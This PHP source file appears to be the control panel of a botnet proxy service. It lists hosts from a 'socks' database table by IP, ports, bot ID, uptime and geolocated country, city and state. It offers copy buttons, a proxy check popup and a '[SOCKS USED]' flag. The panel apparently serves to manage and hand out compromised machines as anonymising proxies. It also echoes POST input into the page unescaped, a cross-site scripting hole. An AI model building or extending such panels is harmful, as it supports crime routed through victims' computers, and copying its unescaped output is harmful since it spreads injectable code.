<?php

include_once('geoipcity.inc');
include_once('../mysqllog.php');

$countrys = $_POST['countrys'];
$states = $_POST['states'];

if ($countrys == "") {
	$countrys = "all";
}
if ($states == "") {
	$states = "all";
}

$date = date("m-d");
list($month, $day) = explode('-', $date);


print "<STYLE><!-- a:link{color:#404040;text-decoration:none;}  a:visited {color:#909090;text-decoration:none;}  a:active {color:#000000;text-decoration:none;}  a:hover {color:#000000;text-decoration:none;}  input {BACKGROUND-COLOR: #66CF96; BORDER-BOTTOM: #ffffff 1px solid; BORDER-LEFT: #ffffff 1px solid; BORDER-RIGHT: #ffffff 1px solid; BORDER-TOP: #ffffff 1px solid; COLOR: #000000; FONT-FAMILY: Tahoma,sans-serif; FONT-SIZE: 12px;}  --></STYLE>
		<BODY bgcolor=#DDDDDD text=#505050 marginwidth=0><table align=center border=1><TD><form action=index.php method=post><B>Select by country</B><TD><select name=countrys><option value=all>All countries";

$j = 1;
while ($GEOIP_COUNTRY_CODES[$j] != "") {
	print "<option value=$GEOIP_COUNTRY_CODES[$j]>$GEOIP_COUNTRY_NAMES[$j]\r\n";
	$j++;
}

print "</SELECT><TD><BR><INPUT type=submit value=submit></FORM><TR><TD>
		<FORM action=index.php method=post><B>Select by state</B><TD><select name=states><option value=all>all<option value=AK>AK<option value=AL>AL<option value=AR>AR<option value=AS>AS<option value=AZ>AZ<option value=CA>CA<option value=CO>CO
		<option value=CT>CT<option value=DC>DC<option value=DE>DE<option value=FL>FL<option value=GA>GA<option value=HI>HI<option value=IA>IA<option value=ID>ID<option value=IL>IL<option value=IN>IN
		<option value=KS>KS<option value=KY>KY<option value=LA>LA<option value=MA>MA<option value=MD>MD<option value=ME>ME<option value=MI>MI<option value=MN>MN<option value=MO>MO<option value=MP>MP
		<option value=MS>MS<option value=MT>MT<option value=NC>NC<option value=ND>ND<option value=NE>NE<option value=NH>NH<option value=NJ>NJ<option value=NM>NM<option value=NV>NU<option value=NY>NY
		<option value=OH>OH<option value=OK>OK<option value=OR>OR<option value=PA>PA<option value=PR>PR<option value=RI>RI<option value=SC>SC<option value=SD>SD<option value=TN>TN<option value=TX>TX
		<option value=UT>UT<option value=VA>VA<option value=VI>VI<option value=VT>VT<option value=WA>WA<option value=WI>WI<option value=WV>WV<option value=WY>WY</select>
		<TD><BR><input type=submit value=submit></form></table><B><CENTER><BR>Current country selected: $countrys<BR>Current state selected: $states</CENTER></B><BR>
		<table width=100% cellspacing=0><tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96><b>List</b></td></tr></table></td></tr>
		<tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96>IP</td><td align=center bgcolor=#66CF96>UPDATE</td><td align=center bgcolor=#66CF96>ID</td>
		<td align=center bgcolor=#66CF96>COUNTRY</td>
		<td align=center bgcolor=#66CF96>CITY</td>
		<td align=center bgcolor=#66CF96>STATE</td>
		<td align=center bgcolor=#66CF96>UPTIME</td></tr>";
     

$stime = mktime();
$stime = $stime - 86400;
$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
$query = 'SELECT * FROM `socks` WHERE `update` > ' . $stime . ' ORDER BY `update` DESC';
$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());

$tot = 0;
while ($row = mysql_fetch_assoc($result)) {
	$prms[0] = $row['ip'];
	$prms[1] = $row['hport'];
	$prms[2] = $row['sport'];
	$prms[3] = $row['update'];
	$prms[4] = $row['uptime'];
	$prms[5] = $row['uid'];
	$prms[6] = $row['used'];
	if ($prms[0] != "") {
		printent($prms,$tot,$countrys,$states);
		$tot++;
	}
}
mysql_close($link);

print "</table><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=right bgcolor=#66CF96>Total: <b>$tot</b></tr></td></table></table></table></tr></td></TABLE></BODY></HTML>";

function printent($prms,$tot,$countrys,$states){
	if(!($tot%2)) {
		$bcolor="#D6D6D6";
	} else {
		$bcolor="#98E8E1";
	}
	
	$tid = $prms[5];
	$tid = chop($tid);
	
	$gi = geoip_open("../GeoIPCity.dat",GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi,$prms[0]);
	geoip_close($gi);

	if (($countrys == "all") & ($states == "all")) {
		echo "<tr>\r\n";
		echo "<td align=left bgcolor=$bcolor onClick=\"window.open('check.php?ip=$prms[0]&port=$prms[2]&hport=$prms[1]','child','scrollbars=no,width=250,height=100');\" onmouseover=\"this.style.background='#000D2A';\" onmouseout=\"this.style.background='$bcolor';\"><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy IP\" onclick=window.clipboardData.setData(\"Text\",\"$prms[0]\")>$prms[0]</font></td>\r\n";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>" . date("H:i:s d.m.y", $prms[3]) ."</font></td>\r\n";//socks
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy ID\" onclick=window.clipboardData.setData(\"Text\",\"$tid\")>&nbsp;$tid</font></td>\r\n";//socks

		// Show flag
		if ($record->country_code == "") {
			$record->country_code = "-";
			$record->country_name = "";
		}

		$c_code = strtolower($record->country_code);
		
		$flag = "<IMG src=../flags/$c_code.gif>&nbsp;$record->country_name.<BR>";
		
		echo "<td align=left bgcolor=$bcolor><font face='Fixedsys' color=#707070>$flag</font></td>\r\n";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>$record->city</font></td>\r\n";//socks 
		if ($record->country_code != "US") $record->region = "";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>$record->region</font></td>\r\n";//socks 
		if ($prms[6] == 1) {
			echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>$prms[4]&nbsp;<font color=red>[SOCKS USED]</font></font></td>\r\n";
		} else {
			echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>$prms[4]</font></td>\r\n";	
		}
		
	}
	if ($countrys == $record->country_code) {
		echo "<tr>\r\n";
		echo "<td align=left bgcolor=$bcolor onClick=\"window.open('check.php?ip=$prms[0]&port=$prms[2]&hport=$prms[1]','child','scrollbars=no,width=250,height=100');\" onmouseover=\"this.style.background='#000D2A';\" onmouseout=\"this.style.background='$bcolor';\"><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy IP\" onclick=window.clipboardData.setData(\"Text\",\"$prms[0]\")>$prms[0]</font></td>\r\n";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>" . date("H:i:s d.m.y", $prms[3]) ."</font></td>\r\n";//socks
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy ID\" onclick=window.clipboardData.setData(\"Text\",\"$tid\")>&nbsp;$tid</font></td>\r\n";//socks

		// Show flag
		if ($record->country_code == "") {
			$record->country_code = "-";
			$record->country_name = "";
		}

		$c_code = strtolower($record->country_code);
		
		$flag = "<IMG src=../flags/$c_code.gif>&nbsp;$record->country_name.<BR>";

		echo "<td align=left bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>".$flag."</font></td>\r\n";
		echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>".$record->city."</font></td>\r\n";//socks 
		if ($record->country_code != "US") $record->region = "";
		echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>".$record->region."</font></td>\r\n";//socks 
		if ($prms[6] == 1) {
			echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>$prms[4]&nbsp;<font color=red>[SOCKS USED]</font></font></td>\r\n";
		} else {
			echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>$prms[4]</font></td>\r\n";	
		}	
	}

	if ($states == $record->region) {
		echo "<tr>\r\n";
		echo "<td align=left bgcolor=$bcolor onClick=\"window.open('check.php?ip=$prms[0]&port=$prms[2]&hport=$prms[1]','child','scrollbars=no,width=250,height=100');\" onmouseover=\"this.style.background='#000D2A';\" onmouseout=\"this.style.background='$bcolor';\"><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy IP\" onclick=window.clipboardData.setData(\"Text\",\"$prms[0]\")>$prms[0]</font></td>\r\n";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>" . date("H:i:s d.m.y", $prms[3]) ."</font></td>\r\n";//socks
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy ID\" onclick=window.clipboardData.setData(\"Text\",\"$tid\")>&nbsp;$tid</font></td>\r\n";//socks
		// Show flag
		if ($record->country_code == "") {
			$record->country_code = "-";
			$record->country_name = "";
		}

		$c_code = strtolower($record->country_code);
		
		$flag = "<IMG src=../flags/$c_code.gif>&nbsp;$record->country_name.<BR>";

		echo "<td align=left bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>".$flag."</font></td>\r\n";
		echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>".$record->city."</font></td>\r\n";
		if ($record->country_code != "US") $record->region = "";
		if ($prms[6] == 1) {
			echo "<td align=center bgcolor=".$bcolor."><font face='Fixedsys' color=#707070>$prms[4]&nbsp;<font color=red>[SOCKS USED]</font></font></td>\r\n";
		} else {
			echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>$prms[4]</font></td>\r\n";	
		}
	}

}

?>